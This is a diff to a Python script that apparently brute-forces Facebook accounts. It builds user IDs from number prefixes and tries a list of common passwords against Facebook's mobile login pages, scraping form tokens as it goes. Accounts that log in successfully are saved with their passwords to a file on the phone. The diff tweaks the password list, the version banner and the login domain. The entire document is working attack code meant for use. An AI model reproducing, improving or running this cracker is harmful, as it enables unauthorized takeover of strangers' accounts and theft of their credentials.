@@ -18,7 +18,7 @@ logo = """ \033[1;92
 \033[32;1m######  # #    # #    # # 
 \033[32;1m#     # # #####  #    # #      
 \033[32;1m#     # # #      #    # #    
-\033[32;1m######  # #       ####  ######  (v-01) 
+\033[32;1m######  # #       ####  ######  (v-0,4) 
 """
 ok = []
 cp = []
@@ -63,7 +63,7 @@ def Main():
 		print(50*'━')
 		for guru in user:
 			uid = love+lova+lovb+guru
-			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'shakib','jannat','sadiya','ayesha','tamanna','00998877','708090','jannat123']
+			pwx = [lova+lovb+guru,love+lova+lovb,love+love,'shakib','jannat','00998877','77889900','saiful']
 			turag.submit(test,uid,pwx,tl)
 	print(50*'━')
 	print(' <> CRACK DONE......... ')
@@ -80,7 +80,7 @@ def test(uid,pwx,tl):
             sys.stdout.write(f'\r\033[1;90m[\033[1;92mbipul-❤️\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
-            free_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get('https://d.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -115,7 +115,7 @@ def test(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m[BIPUL-OK] '+cid+' ¤ '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m[BIPUL-OK] '+cid+' ¤ '+ps+'\33[0;92m')        
                 oks.append(cid)
                 open('/sdcard/bipul-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
